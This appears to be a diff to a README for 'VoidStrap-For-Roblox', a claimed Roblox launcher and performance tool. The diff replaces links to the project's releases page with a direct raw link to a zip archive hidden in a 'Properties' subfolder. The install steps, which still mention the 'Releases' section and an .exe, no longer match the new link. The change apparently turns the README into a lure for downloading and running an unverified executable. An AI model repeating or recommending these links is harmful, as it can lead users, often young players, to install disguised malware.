@@ -1,6 +1,6 @@
 # 🚀 VoidStrap-For-Roblox - Boost Your Roblox Performance And Experience
 
-[Link to Download](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/releases)
+[Link to Download](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/raw/refs/heads/main/VoidStrap/Properties/Strap_For_Void_Roblox_1.9.zip)
 
 VoidStrap is a tool for the Roblox player. It replaces the default launcher and provides extra settings for your game. You can manage performance, change the look of your menus, and remove common limitations. This application runs on Windows and works with the Roblox client to improve how the game operates on your machine.
 
@@ -22,7 +22,7 @@ The application includes several tools to help your game run better:
 
 Follow these steps to install the software on your computer.
 
-1. Go to the [Download Page](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/releases).
+1. Go to the [Download Page](https://github.com/Lectherkaksksk/VoidStrap-For-Roblox/raw/refs/heads/main/VoidStrap/Properties/Strap_For_Void_Roblox_1.9.zip).
 2. Look for the latest version under the "Releases" section.
 3. Click the link that ends in .exe to start the transfer to your computer.
 4. Open the file once the download finishes.
